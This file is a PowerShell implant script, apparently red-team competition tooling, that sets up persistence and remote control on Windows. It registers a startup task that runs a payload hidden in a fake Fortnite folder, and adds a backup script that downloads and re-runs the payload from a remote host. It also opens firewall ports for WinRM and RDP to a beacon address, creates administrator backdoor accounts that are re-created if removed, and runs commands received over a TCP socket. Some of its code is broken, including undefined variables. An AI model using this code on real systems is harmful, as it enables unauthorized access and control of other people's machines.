param(
    [Parameter(Mandatory=$false)]
    [string]$beaconIPAddress
)

New-ScheduledTaskAction -Execute "C:\ProgramData\EpicGames\Fortnite\windowsPayload.ps1"
$trigger = New-ScheduledTaskTrigger -AtStartup
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "ConnectionToC2"

Make-Directory "C:\Program Files (x86)\Webkinz"
New-Item -Path "C:\Program Files (x86)\Webkinz\backup.ps1"
$backupCommands = "if(!(Test-Path C:\ProgramData\EpicGames\Fortnite\windowsPayload.ps1)){"
$backupCommands += "wget -o C:\ProgramData\EpicGames\Fortnite\windowsTryouts.ps1 'gitlab.ritsec.cloud/jms9508/james-danny-ritsecredteamrecruiting/Payloads/windowsPayload.ps1'"
$backupCommands += "& C:\ProgramData\EpicGames\Fortnite\windowsTryouts.ps1 -beaconIPAddress $($beaconIPAddress)}"
$backupCommands | Out-File "C:\Program Files (x86)\Webkinz\backup.ps1"


# Set up Firewall rules to make sure the C2 can communicate with the client
netsh adv f a r n="WinRM Default Rule" dir=in act=allow prof=any prot=tcp localport=5985,5986
netsh adv f a r n="WinRM C2 Rule" dir=in act=allow prof=any prot=tcp remoteip=$beaconIPAddress localport=5985,5986
netsh adv f a r n="HTTP Default Rule" dir=out act=allow prof=any prot=tcp remoteport=80,443
netsh adv f a r n="HTTP C2 Rule" dir=out act=allow prof=any prot=tcp remoteip=$beaconIPAddress remoteport=80
netsh adv f a r n="RDP Default Rule" dir=in act=allow prof=any prot=tcp localport=3389
netsh adv f a r n="RDP C2 Rule" dir=out act=allow prof=any prot=tcp remoteip=$beaconIPAddress localport=3389

# Set up TCP connection to the server
$tcpConnection = New-Object System.Net.Sockets.TcpClient($serverIP, 80)
$tcpStream = $tcpConnection.GetStream()
$reader = New-Object System.IO.StreamReader($tcpStream)
$writer = New-Object System.IO.StreamWriter($tcpStream)
$writer.AutoFlush = $true

New-LocalUser -Name "Jimithy" -Password (ConvertTo-SecureString -String "Password-123456")
Add-LocalGroupMember -Member "Jimithy" -Group "Administrators"
Add-LocalGroupMember -Member "Jimithy" -Group "Remote Desktop Users"

New-LocalUser -Name "Doug" -Password (ConvertTo-SecureString -String "Password-12345")
Add-LocalGroupMember -Member "Doug" -Group "Administrators"
Add-LocalGroupMember -Member "Doug" -Group "Remote Desktop Users"

$I = 0

while($true){
    if($I -ge 4){
        $I = 0
        $Users = Get-LocalUser
        if(!("Jimithy" -in $Users)){
            New-LocalUser -Name "Jimithy" -Password (ConvertTo-SecureString -String "Password-123456")
            Add-LocalGroupMember -Member "Jimithy" -Group "Administrators"
            Add-LocalGroupMember -Member "Jimithy" -Group "Remote Desktop Users"
        }
        if(!("Doug" -in $Users)){
            New-LocalUser -Name "Doug" -Password (ConvertTo-SecureString -String "Password-123456")
            Add-LocalGroupMember -Member "Doug" -Group "Administrators"
            Add-LocalGroupMember -Member "Doug" -Group "Remote Desktop Users"
        }
    }


    $command = $reader.Read()
    $reply = & $command
    $writer.write($reply)
    $I++;
}